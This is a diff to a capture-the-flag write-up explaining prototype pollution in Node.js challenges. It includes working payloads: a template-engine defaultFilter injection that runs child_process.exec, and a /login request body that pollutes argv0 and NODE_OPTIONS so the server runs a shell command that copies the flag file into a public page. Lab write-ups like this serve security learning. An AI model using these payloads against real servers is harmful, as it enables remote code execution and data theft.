@@ -23,7 +23,8 @@ function deepMerge(target, source) {
 }
 ```
 In this function, it uses `target[key] = source[key]` to assign the value of `source[key]` to `target[key]`. 
-However, if the target is something like `__proto__`, then it will pollute all objects.
+However, if the target is something like `__proto__`, then it will pollute all objects. For example, 
+in this case, `__proto__.flag = polluted`.
 
 ### How to exploit the vulnerability and retrieve the flag
 
@@ -76,8 +77,9 @@ function deepMerge(target, source) {
 ```
 In this function, it uses `target[key] = source[key]` to assign the value of `source[key]` to `target[key]`.
 However, if the target is something like `__proto__`, then it will pollute all objects.
-The template engine will be polluted, and if we attatch some code to the template engine,
-we can execute arbitrary code as it is rendered.
+In this case, `__proto__.defaultFilter`.
+The template engine will be polluted, and 
+we can execute arbitrary code by calling the `defaultFilter` as the engine is rendering.
 
 ### How to exploit the vulnerability and retrieve the flag
 
@@ -90,7 +92,7 @@ that would create the data package looking like this (`1` are just placeholders)
         "AQ": "1",
         "latitude": "1",
         "longitude": "1",
-        "defaultFilter": "e')); process.report.writeReport('touch.txt');//"
+      "defaultFilter": "e')); process.mainModule.constructor._load('child_process').exec('touch touch.txt');//"
     }
 }
 ```
@@ -106,7 +108,34 @@ to prevent prototype pollution.
 
 ### Where is the vulnerability and why it occurs
 
+The vulnerability is the ION parser.
+```javascript
+set(key, val) {
+    let keyElements = splitElements(key);
+    key = keyElements.pop();
+    let elements = this.getFullScope(keyElements);
+    let data = getTable(this.data, elements);
+    if (typeof data == 'string')
+        return data;
+    data[key] = val;
+}
+```
+There is no checks for keys like `__proto__`, `constructor`,
+or `prototype`, which may lead to prototype pollution like the previous two challenges.
+And since the server uses `child_process.spawn()` to restart when error happens, 
+we can pollute argv0 and NODE_OPTIONS to execute arbitrary code.
+
 ### How to exploit the vulnerability and retrieve the flag
+
+To trigger the vulnerability, I sent a `POST` request to the `/login` with the following body:
+```text
+title = "userData"
+
+[__proto__] 
+argv0 = "require('child_process').exec('cat ./flag.txt > ./public/pages/empty.html', {shell: '/bin/bash'},(error, stdout, stderr) => {if (error) {console.error('RCE');return;}})//"
+NODE_OPTIONS = "--require /proc/self/cmdline"
+```
+This allows me to modify the content of empty.html to the content of the flag, and then I can retrieve the flag by visiting `/empty`.
 
 ### How the .patch file works
 
